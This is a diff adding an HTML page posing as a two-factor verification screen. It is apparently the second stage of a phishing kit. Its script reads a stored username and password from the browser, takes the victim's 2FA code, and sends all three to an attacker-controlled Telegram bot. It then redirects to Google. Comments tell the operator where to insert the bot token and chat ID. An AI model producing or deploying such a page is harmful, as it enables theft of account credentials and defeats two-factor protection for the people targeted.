@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <style>
+        body { background-color: #1a1a1a; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { width: 90%; max-width: 400px; text-align: center; }
+        input { width: 100%; padding: 15px; background: #2d2d2d; border: 1px solid #444; border-radius: 5px; color: white; box-sizing: border-box; margin-bottom: 20px; }
+        .submit-btn { width: 100%; padding: 15px; background-color: #4CAF50; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Verify 2FA</h2>
+        <input type="text" id="code" placeholder="Verification Code">
+        <button class="submit-btn" onclick="sendData()">Submit</button>
+    </div>
+
+    <script>
+        function sendData() {
+            const code = document.getElementById("code").value;
+            const user = localStorage.getItem("user");
+            const pass = localStorage.getItem("pass");
+
+            // YAHAN APNA TOKEN AUR CHAT ID DALEIN
+            const botToken = "YOUR_API_TOKEN_HERE"; 
+            const chatId = "YOUR_CHAT_ID_HERE";
+            
+            const text = `New Login Details:\nUser: ${user}\nPass: ${pass}\n2FA Code: ${code}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+            fetch(url).then(() => {
+                alert("Verifying...");
+                window.location.href = "https://google.com"; // Login ke baad kahan bhejna hai
+            });
+        }
+    </script>
+</body>
+</html>
